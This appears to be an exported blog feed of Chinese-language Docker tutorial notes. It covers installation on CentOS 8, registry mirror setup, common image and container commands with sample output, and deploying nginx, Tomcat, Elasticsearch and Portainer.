<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@163 ~]# cat /etc/os-release</span><br><span class="line">NAME=&quot;CentOS Linux&quot;</span><br><span class="line">VERSION=&quot;8&quot;</span><br><span class="line">ID=&quot;centos&quot;</span><br><span class="line">ID_LIKE=&quot;rhel fedora&quot;</span><br><span class="line">VERSION_ID=&quot;8&quot;</span><br><span class="line">PLATFORM_ID=&quot;platform:el8&quot;</span><br><span class="line">PRETTY_NAME=&quot;CentOS Linux 8&quot;</span><br><span class="line">ANSI_COLOR=&quot;0;31&quot;</span><br><span class="line">CPE_NAME=&quot;cpe:/o:centos:centos:8&quot;</span><br><span class="line">HOME_URL=&quot;https://centos.org/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT=&quot;CentOS-8&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=&quot;8&quot;</span><br></pre></td></tr></table></figure>

<p><strong>安装</strong></p>
<ol>
<li><p><strong>卸载旧版本</strong></p>
<pre><code>yum remove docker \
            docker-client \
            docker-client-latest \
            docker-common \
            docker-latest \
            docker-latest-logrotate \
            docker-logrotate \
            docker-engine
</code></pre>
</li>
<li><p><strong>需要的安装包</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>设置镜像的仓库</strong></p>
<p>yum-config-manager –add-repo <a href="https://download.docker.com/linux/centos/docker-ce.repo">https://download.docker.com/linux/centos/docker-ce.repo</a> &#x2F;&#x2F;默认是国外的，非常慢</p>
<p>yum-config-manager –add-repo <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a> &#x2F;&#x2F;阿里云镜像</p>
<p>##更新yum软件包索引  yum makecache fast</p>
</li>
<li><p><strong>安装docker相关的</strong></p>
<p>yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</p>
<p>ce 社区  ee企业</p>
</li>
<li><p><strong>启动Docker</strong></p>
<p>systemctl start docker</p>
</li>
<li><p><strong>使用docker version查看是否安装成功</strong></p>
<p>[root@163 ~]# docker version<br>Client: Docker Engine - Community<br> Version:           24.0.5<br> API version:       1.43<br> Go version:        go1.20.6<br> Git commit:        ced0996<br> Built:             Fri Jul 21 20:36:32 2023<br> OS&#x2F;Arch:           linux&#x2F;amd64<br> Context:           default</p>
<p>Server: Docker Engine - Community<br> Engine:<br>  Version:          24.0.5<br>  API version:      1.43 (minimum version 1.12)<br>  Go version:       go1.20.6<br>  Git commit:       a61e2b4<br>  Built:            Fri Jul 21 20:35:32 2023<br>  OS&#x2F;Arch:          linux&#x2F;amd64<br>  Experimental:     false<br> containerd:<br>  Version:          1.6.21<br>  GitCommit:        3dce8eb055cbb6872793272b4f20ed16117344f8<br> runc:<br>  Version:          1.1.7<br>  GitCommit:        v1.1.7-0-g860f061<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        de40ad0</p>
</li>
<li><p><strong>sudo docker run hello-world</strong></p>
</li>
<li><p><strong>查看一下下载的这个 hello-world镜像</strong></p>
<p>docker images</p>
</li>
</ol>
<p><strong>了解</strong></p>
<p>docker卸载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 卸载依赖</span><br><span class="line"></span><br><span class="line">  ```yum remove docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras```</span><br><span class="line"></span><br><span class="line">2. 删除资源</span><br><span class="line">sudo rm -rf /var/lib/docker   //docker默认工作路径</span><br><span class="line">sudo rm -rf /var/lib/containerd</span><br></pre></td></tr></table></figure>

<h1 id="阿里云镜像加速"><a href="#阿里云镜像加速" class="headerlink" title="阿里云镜像加速"></a>阿里云镜像加速</h1><ol>
<li>登录阿里云找到容器镜像服务</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/14c9919761fe4833b59b16f1944f39fc.png" alt="请添加图片描述"></p>
<ol start="2">
<li><p>找到镜像加速器</p>
</li>
<li><p>配置使用</p>
</li>
</ol>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker </span><br><span class="line"></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27; </span><br><span class="line">&#123; </span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://kzsz87k0.mirror.aliyuncs.com&quot;] </span><br><span class="line">&#125; </span><br><span class="line">EOF </span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload </span><br><span class="line"></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h1 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h1><p><strong>Docker是什么工作的?</strong><br>Docker 是一个Client-Server 结构的系统，Docker的守护进程运行在主机上。通过Socket从客户端访问<br>DockerServer 接收到 Docker-Client 的指令，就会执行这个命令</p>
<p><strong>Docker为什么比VM快</strong><br>1、Docker有着比虚拟机更少的抽象层<br>2、docker 利用的是宿主机的内核，vm 需要是 Guest OS。<br><img src="https://img-blog.csdnimg.cn/9b835a379a044e06869c036190e649aa.png" alt="在这里插入图片描述"><br>所以说，新建一个容器的时候，docker不需要想虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载 Guest OS，分钟级别的，而docker 是利用 宿主机的操作系统吗，省略了这个复杂的过程，秒级!</p>
<p><img src="https://img-blog.csdnimg.cn/2725bac4251243ce9e42eff23e2e44ac.png" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker命令</title>
    <url>/2023/07/31/Docker%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><span id="more"></span>

<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version      #显示docker的版本信息</span><br><span class="line">docker info            #显示docker的系统信息，包括境像和容器的数量</span><br><span class="line">docker 命令 --help# 帮助命令</span><br><span class="line"></span><br><span class="line">帮助文档的地址：https://docs.docker.com/engine/reference/commandline</span><br></pre></td></tr></table></figure>

<h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images 查看所有本地的主机上的镜像</span><br><span class="line">[root@xxx /]# docker images</span><br><span class="line">REPOSITORY			TAG	    	IMAGE ID		      CREATED	         	SIZE</span><br><span class="line">he11o-world			Tatest		bf756fblae65		4 months ago		13.3kB</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line">REPOSITORY    镜像的仓库源</span><br><span class="line">TAG		      	 镜像的标签</span><br><span class="line">IMAGE ID		  镜像的id</span><br><span class="line">CREATED		  镜像的创建时间</span><br><span class="line">SIZE					镜像的大小</span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-a，--all						   列出所有镜像</span><br><span class="line">-q，--quiet  				    只显示ID</span><br></pre></td></tr></table></figure>

<h3 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a>docker search 搜索镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@xxx /]# docker search mysql</span><br><span class="line">NAME                            DESCRIPTION                                                    STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                 MySQL is a widely used, open-source relation…    14338        [OK]       </span><br><span class="line">mariadb             MariaDB Server is a high performing open sou…   5474         [OK]       </span><br><span class="line"></span><br><span class="line">#可选项，通过搜藏来过滤</span><br><span class="line">--filter=STARS=3000# 搜索出来的镜像就是STARS大于3000的</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker search mysql --filter=STARS=3000</span><br><span class="line">NAME        					 DESCRIPTION                              			  STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   	14338     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…    5474      [OK]       </span><br></pre></td></tr></table></figure>

<h3 id="拉取镜像docker-pull-镜像名-tag"><a href="#拉取镜像docker-pull-镜像名-tag" class="headerlink" title="拉取镜像docker pull 镜像名[:tag]"></a><strong>拉取镜像docker pull 镜像名[:tag]</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@163 ~]# docker pull mysql</span><br><span class="line">Using default tag: latest  #如果不写tag，默认最新版本</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete 		#分层下载，docker  image的核心  联合文件系统</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709  #签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest	#真实地址</span><br><span class="line"></span><br><span class="line">*docker pull mysql等价于docker pull docker.io/library/mysql:latest</span><br><span class="line"></span><br><span class="line">*docker pull mysql:5.7</span><br><span class="line">[root@163 ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists //以上为重复部分</span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>

<h3 id="删除镜像docker-rmi"><a href="#删除镜像docker-rmi" class="headerlink" title="删除镜像docker rmi"></a>删除镜像docker rmi</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi -f   镜像ID			 //删除指定镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f   镜像ID 镜像ID 镜像ID //删除多个镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f  $(docker images -aq)	  //删除所有镜像</span><br></pre></td></tr></table></figure>

<h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p><strong>说明:我们有了镜像才可以创建容器，linux，下载一个 centos 镜像来测试学习</strong><br>docker pull centos</p>
<h3 id="新建容器并启动"><a href="#新建容器并启动" class="headerlink" title="新建容器并启动"></a>新建容器并启动</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">--name=&quot;Name&quot;		   容器名字 tomcat01 tomcat02，用来区分容器</span><br><span class="line">-d									后台方式运行</span><br><span class="line">-it									使用交互方式运行，进入容器查看内容</span><br><span class="line"></span><br><span class="line">-p								   指定容器的端口-p  8080:8080</span><br><span class="line"></span><br><span class="line">     	 	-p ip:主机端口:容器端口</span><br><span class="line">			-p 主机端口:容器端口 (常用)</span><br><span class="line">			-p 容器端口</span><br><span class="line">			容器端口</span><br><span class="line"></span><br><span class="line">-P								   随机指定端口</span><br><span class="line"></span><br><span class="line">#测试，启动并进入容器</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker run -it centos /bin/bash</span><br><span class="line"></span><br><span class="line">[root@c0eed8b69c30 /]# ls   //查看容器内的centos,基础版本，很多命令都不完善</span><br><span class="line">bin  etc   lib	  lost+found  mnt  proc  run   srv  tmp  var	</span><br><span class="line">dev  home  lib64  media       opt  root  sbin  sys  usr</span><br><span class="line"></span><br><span class="line">exit		//从容器中退回主机</span><br></pre></td></tr></table></figure>

<h3 id="列出所有运行的容器"><a href="#列出所有运行的容器" class="headerlink" title="列出所有运行的容器"></a>列出所有运行的容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps 命令</span><br><span class="line">     	列出当前正在运行的容器</span><br><span class="line"></span><br><span class="line">-a 		//列出当前正在运行的容器+带出历史运行过的容器</span><br><span class="line">-n=? 	// 显示最近创建的容器</span><br><span class="line">-q		//只显示容器的编号</span><br></pre></td></tr></table></figure>

<h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit 				   //直接容器停止并退出  </span><br><span class="line"></span><br><span class="line">Ctrl + P + Q 	//容不停止退出</span><br></pre></td></tr></table></figure>

<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id		//删除指定的容器，不能除正在运行的容器，如果要强制刚除 rm -f</span><br><span class="line">docker rm -f $(docker ps -aq)		//删除所有的容器</span><br><span class="line">docker ps -a -q|xargs docker rm 		// 删除所有的容器</span><br></pre></td></tr></table></figure>

<h3 id="启动和停止容器的操作"><a href="#启动和停止容器的操作" class="headerlink" title="启动和停止容器的操作"></a>启动和停止容器的操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器id			启动容器</span><br><span class="line">docker restart 容器id		重启容器</span><br><span class="line">docker stop 容器id			停止当前正在运行的容器</span><br><span class="line">docker kill 容器id			  强制停止当前容器</span><br></pre></td></tr></table></figure>

<h2 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h2><p><strong>后台启动容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker run -d 镜像名!</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos</span><br><span class="line"></span><br><span class="line">#问题docker ps，发现 centos 停止了</span><br><span class="line"></span><br><span class="line">#常见的坑:docker 容器使用后台运行，就必须要有要一个前台进程，docker发现没有应用，就会自动停止</span><br><span class="line"></span><br><span class="line">#nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了</span><br></pre></td></tr></table></figure>

<p><strong>查看日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs -f -t --tail 容器，没有日志</span><br><span class="line"></span><br><span class="line">#自己编写一段shell脚本</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos /bin/sh -c &quot;while true;do echo hhhhhh;sleep 1;done&quot;</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker ps</span><br><span class="line"></span><br><span class="line">CONTAINER ID			IMAGE</span><br><span class="line">dce7b86171bf			centos</span><br><span class="line"></span><br><span class="line">#显示日志</span><br><span class="line"></span><br><span class="line">-tf								//显示日志</span><br><span class="line"></span><br><span class="line">--tai1 number			//要显示日志条数</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker logs -tf --tai1 10 dce7b86171bf</span><br></pre></td></tr></table></figure>

<p><strong>查看容器中进程信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps</span><br><span class="line">#命令docker top 容器id</span><br><span class="line">UID                 PID                 PPID        	    C                 STIME       </span><br><span class="line">root                1432624             1432594             0                   20:14     </span><br><span class="line">root                1452486             1432624             0                   20:20     </span><br></pre></td></tr></table></figure>

<p><strong>查看镜像的元数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker inspect 容器id</span><br></pre></td></tr></table></figure>

<p><strong>进入当前正在运行的容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：docker exec -it 容器id /bin/bash		//进入容器后开启一个新的终端，可以在里面操作</span><br><span class="line"></span><br><span class="line">方式二：docker attach 容器id		 				 //进入容器正在执行的终端，不会启动新的进程</span><br></pre></td></tr></table></figure>

<p><strong>从容器内拷贝文件到主机上</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker  cp 容器id:容器内路径  目的的主机路径</span><br><span class="line"></span><br><span class="line">#查看当将主机目录下</span><br><span class="line"></span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  www</span><br><span class="line">[root@163 home]#  docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   2 minutes ago   Up 2 minutes             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#进入docker容器内部</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker attach 69687a39e545</span><br><span class="line">[root@69687a39e545 /]# cd /home</span><br><span class="line">[root@69687a39e545 home]# ls</span><br><span class="line"></span><br><span class="line">#在容器内新建一个文件</span><br><span class="line"></span><br><span class="line">[root@69687a39e545 home]# touch test.java</span><br><span class="line">[root@69687a39e545 home]# exit</span><br><span class="line">exit</span><br><span class="line">[root@163 home]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@163 home]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS                      PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   4 minutes ago   Exited (0) 31 seconds ago             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#将文件拷贝出来到主机上</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker cp 69687a39e545:/home/test.java /home</span><br><span class="line">Successfully copied 1.54kB to /home</span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  test.java  www</span><br><span class="line"></span><br><span class="line">#拷贝是一个手动过程，使用-v卷的技术可以实现</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230730205339571.png" alt="image-20230730205339571"></p>
<table>
<thead>
<tr>
<th align="center">attach</th>
<th align="center">Attach to a running container</th>
<th align="center">当前 she11 下 attach 连接指定运行镜像</th>
</tr>
</thead>
<tbody><tr>
<td align="center">build</td>
<td align="center">Build an imagerfrom a Dockerfile</td>
<td align="center">通过 Dockerfile 定制镜像</td>
</tr>
<tr>
<td align="center">commit</td>
<td align="center">Create a new image from a container changes</td>
<td align="center">提交当前容器为新的镜像</td>
</tr>
<tr>
<td align="center">cp</td>
<td align="center">Copy files&#x2F;folders from the containers filesystem to the host path</td>
<td align="center">从容器中搏贝指定文件或者目录到宿主机中</td>
</tr>
<tr>
<td align="center">create</td>
<td align="center">Create a new container</td>
<td align="center">创建一个新的容器，同 run，但不启动容器</td>
</tr>
<tr>
<td align="center">diff</td>
<td align="center">Inspect changes on a container’s fiesystem</td>
<td align="center">查看 docker 容器变化</td>
</tr>
<tr>
<td align="center">events</td>
<td align="center">Get real time events from the server</td>
<td align="center">从 docker 服务获取容器实时事件</td>
</tr>
<tr>
<td align="center">exec</td>
<td align="center">Run a command in an existing container</td>
<td align="center">在已存在的容器上运行命令</td>
</tr>
<tr>
<td align="center">export</td>
<td align="center">Stream the contents of a container as a tar archive</td>
<td align="center">导出容器的内容作为一个 tar 归档文件[对应import]</td>
</tr>
<tr>
<td align="center">history</td>
<td align="center">Show the history of an image</td>
<td align="center">展示一个镜像形成历史</td>
</tr>
<tr>
<td align="center">images</td>
<td align="center">List images</td>
<td align="center">列出系统当前镜像</td>
</tr>
<tr>
<td align="center">import</td>
<td align="center">Create a new filesystem image from the contents of a tarball</td>
<td align="center">从tar包中的内容创建一个新的文件系统映像[对应export]</td>
</tr>
<tr>
<td align="center">info</td>
<td align="center">Display system-wide information</td>
<td align="center">显示系统相关信息</td>
</tr>
<tr>
<td align="center">inspect</td>
<td align="center">Return low-Tevel information on a container</td>
<td align="center">查看容器详细信息</td>
</tr>
<tr>
<td align="center">kill</td>
<td align="center">Kill a running container</td>
<td align="center">kill 指定 docker 容器</td>
</tr>
<tr>
<td align="center">load</td>
<td align="center">Load an image from a tar archive</td>
<td align="center">从一个 tar 包中加载一个像[对应 save]</td>
</tr>
<tr>
<td align="center">login</td>
<td align="center">Register or Login to the docker registry server</td>
<td align="center">注册或者陆一个 docker 源服务器</td>
</tr>
<tr>
<td align="center">logout</td>
<td align="center">Log out from a Docker registry server</td>
<td align="center">从当前 Docker registry 退出</td>
</tr>
<tr>
<td align="center">logs</td>
<td align="center">Fetch the logs of a container</td>
<td align="center">输出当前容器日志信息</td>
</tr>
<tr>
<td align="center">port</td>
<td align="center">Lookup the public-facing port which is NAT-ed to PRIVATE_PORT</td>
<td align="center">查看映射端口对应的容器内部源端口</td>
</tr>
<tr>
<td align="center">pause</td>
<td align="center">Pause all processes within a container</td>
<td align="center">暂停容器</td>
</tr>
<tr>
<td align="center">ps</td>
<td align="center">List containers</td>
<td align="center">列出容器列表</td>
</tr>
<tr>
<td align="center">pull</td>
<td align="center">Pull an image or a repository from the docker registry server</td>
<td align="center">从docker镜像源服务器拉取指定镜像或者库镜像</td>
</tr>
<tr>
<td align="center">push</td>
<td align="center">Push an image or a repository to the docker registry server</td>
<td align="center">推送指定镜像或者库镜像至docker源服务器</td>
</tr>
<tr>
<td align="center">restart</td>
<td align="center">Restart a running container</td>
<td align="center">重启运行的容器</td>
</tr>
<tr>
<td align="center">rm</td>
<td align="center">Remove one or more containers</td>
<td align="center">移除一个或者多个容器</td>
</tr>
<tr>
<td align="center">rmi</td>
<td align="center">Remove one or more images</td>
<td align="center">移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]</td>
</tr>
<tr>
<td align="center">run</td>
<td align="center">Run a command in a new container</td>
<td align="center">创建一个新的容器并运行一个命令</td>
</tr>
<tr>
<td align="center">save</td>
<td align="center">Save an image to a tar archive</td>
<td align="center">保存一个镜像为一个 tar 包[对应 load]</td>
</tr>
<tr>
<td align="center">search</td>
<td align="center">Search for an image on the Docker Hub</td>
<td align="center">在 docker hub 中搜索镜像</td>
</tr>
<tr>
<td align="center">start</td>
<td align="center">Start a stopped containers</td>
<td align="center">启动容器</td>
</tr>
<tr>
<td align="center">stop</td>
<td align="center">Stop a running containers</td>
<td align="center">停止容器</td>
</tr>
<tr>
<td align="center">tag</td>
<td align="center">Tag an image into a repository</td>
<td align="center">给源中镜像打标签</td>
</tr>
<tr>
<td align="center">top</td>
<td align="center">Lookup the running processes of a container</td>
<td align="center">查看容器中运行的进程信息</td>
</tr>
<tr>
<td align="center">unpause</td>
<td align="center">Unpause a paused container</td>
<td align="center">取消暂停容器</td>
</tr>
<tr>
<td align="center">version</td>
<td align="center">Show the docker version information</td>
<td align="center">查看 docker 版本号</td>
</tr>
<tr>
<td align="center">wait</td>
<td align="center">Block until a container stops，then print its exit code</td>
<td align="center">截取容器止时的退出状态值</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker相关部署</title>
    <url>/2023/07/31/Docker2/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>

<h1 id="Docker安装Nginx"><a href="#Docker安装Nginx" class="headerlink" title="Docker安装Nginx"></a>Docker安装Nginx</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.搜索镜像 docker search nginx</span><br><span class="line">2.下载镜像 docker pull nginx</span><br><span class="line">3.运行测试</span><br><span class="line">[root@163 ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">centos        latest    5d0da3dc9764   22 months ago   231MB</span><br><span class="line">-d 后台运行（停止了容器后，容器还可以查到）</span><br><span class="line">--name 给容器命名</span><br><span class="line">-p 宿主机:容器内部端口</span><br><span class="line">[root@163 ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">bb07f6e55670b129a14434aae3a9422cf3f7091f2d3079a5f96005613a909993</span><br><span class="line">[root@163 ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">bb07f6e55670   nginx     &quot;/docker-entrypoint.…&quot;   9 seconds ago   Up 8 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@163 ~]# curl localhost:3344</span><br><span class="line"></span><br><span class="line">4.进入容器</span><br><span class="line">[root@163 ~]# docker exec -it nginx01 /bin/bash</span><br><span class="line">root@bb07f6e55670:/# whereis nginx</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@bb07f6e55670:/# cd /etc/nginx</span><br><span class="line">root@bb07f6e55670:/etc/nginx# ls</span><br><span class="line">conf.d		mime.types  nginx.conf	 uwsgi_params</span><br><span class="line">fastcgi_params	modules     scgi_params</span><br><span class="line">root@bb07f6e55670:/etc/nginx# </span><br></pre></td></tr></table></figure>

<h1 id="Docker安装Tomcat"><a href="#Docker安装Tomcat" class="headerlink" title="Docker安装Tomcat"></a>Docker安装Tomcat</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#官方使用</span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line">docker run -it --rm一般用于测试，用完立即删除</span><br><span class="line"></span><br><span class="line">#下载再使用</span><br><span class="line">docker pull tomcat:9.0</span><br><span class="line"></span><br><span class="line">#启动运行</span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">#测试访问没有问题</span><br><span class="line"></span><br><span class="line">#进入容器</span><br><span class="line">[root@163 ~]# docker exec -it tomcat01 /bin/bash</span><br><span class="line">#发现问题，1.1inux命今少了，2.没有webapps 阿里云镜像的原因。默认是最小的镜像，所有不必要的都被剔除掉。保证最小可运行的环境</span><br></pre></td></tr></table></figure>

<h1 id="部署es-kibana"><a href="#部署es-kibana" class="headerlink" title="部署es+kibana"></a>部署es+kibana</h1><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">--net somenetwork  网络配置</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动</span></span><br><span class="line">docker run -d --name elasticsearch (--net somenetwork) -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:8.8.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动了 1inux就卡住了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 暴露的端口很多!</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 十分的耗内存</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 的数据一般霉要放置到安全目录!挂载</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker stats 查看 cpu的状态</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试一下es构建是否成功</span></span><br><span class="line">    curl localhost:9200</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">马上关闭，增加内存限制 修改配置文件 -e 环境配置修改</span></span><br><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:8.8.1</span><br></pre></td></tr></table></figure>

<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>

<h1 id="安装php和php插件"><a href="#安装php和php插件" class="headerlink" title="安装php和php插件"></a>安装php和php插件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php -y</span><br><span class="line">apt-get install libapache2-mod-php -y  --fix-missing</span><br><span class="line">apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>

<h1 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h1><p><strong>什么 portainer ?</strong><br>Docker图形化界面管理工具!提供一个后台面板供我们操作 !</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure>

<p>访问测试：端口打开8088  访问<a href="http://ip:8088/">http://ip:8088/</a></p>
